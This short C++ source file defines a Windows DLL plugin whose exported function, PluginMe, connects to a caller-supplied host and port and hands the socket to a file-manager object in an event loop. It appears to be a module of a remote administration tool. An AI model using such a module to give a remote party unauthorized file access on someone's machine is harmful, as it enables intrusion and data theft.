#include "StdAfx.h"
#include "ClientSocket.h"
#include "MyFileManager.h"

extern "C" __declspec(dllexport) BOOL PluginMe(LPCSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(lpszHost, nPort))
		return -1;

	CMyFileManager	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}

BOOL APIENTRY mymain(HANDLE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	return TRUE;
}

